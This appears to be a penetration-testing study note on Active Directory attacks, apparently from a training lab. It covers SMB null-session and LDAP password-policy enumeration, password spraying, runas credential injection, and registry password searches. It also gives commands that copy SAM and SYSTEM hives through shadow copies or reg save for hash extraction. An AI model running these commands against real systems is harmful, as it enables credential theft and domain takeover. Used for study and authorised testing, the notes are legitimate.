# Enumerating Password Policies
- [[Enum4Linux]]
- [[CrackMapExec]]
- [[RPCclient]]

All of these tools rely on an SMB Null session to work if we do not already have domain credentials. From Windows we can try

```shell
net use \\<DC>\ipc$ "" /u:"" # Test if SMB null sessions are allowed 
```

- [[LDAPSearch]]
- [[PowerView]]

LDAPSearch uses an LDAP Anonymous Bind session to enumerate password policy. 

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

From Windows is even easier.

```shell
net accounts
```

# Password Spraying
Many different toolsets can be used for this. It is covered in more detail here: [[Cyber/RedTeamVault/Techniques/Password Attacks|Password Attacks]]
- [[MailSniper]]
- [[SprayingToolkit]]
- [[CrackMapExec]]
- [[Hydra]]

# Credential Injection
## Runas
```powershell
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

With credential access and a Windows machine you can connect to the domain and use the Microsoft Management Console to enumerate machines and users in the environment. 

# Credential Harvesting
- Keylogging
	- [[Meterpreter]]
- Cleartext Credentials
	- Command history
	- Config files
	- Backup files
	- Shared files
	- Registry
		- `reg query <HKLM/HKCU> /f password /t REG_SZ /s
	- Source code
- SAM
	- [[Meterpreter]] hashdump 
	- Volume Shadow Copy
```powershell
wmic shadowcopy call create C:\
vssadmin list shadows

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```
- Registry Hives
```powershell
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
# From here you can use impacket-secretsDump to read the hashes out. 
```
- LSASS
[[Mimikatz]] can dump and unprotect LSASS using sekurlsa and mimidrv.sys. 
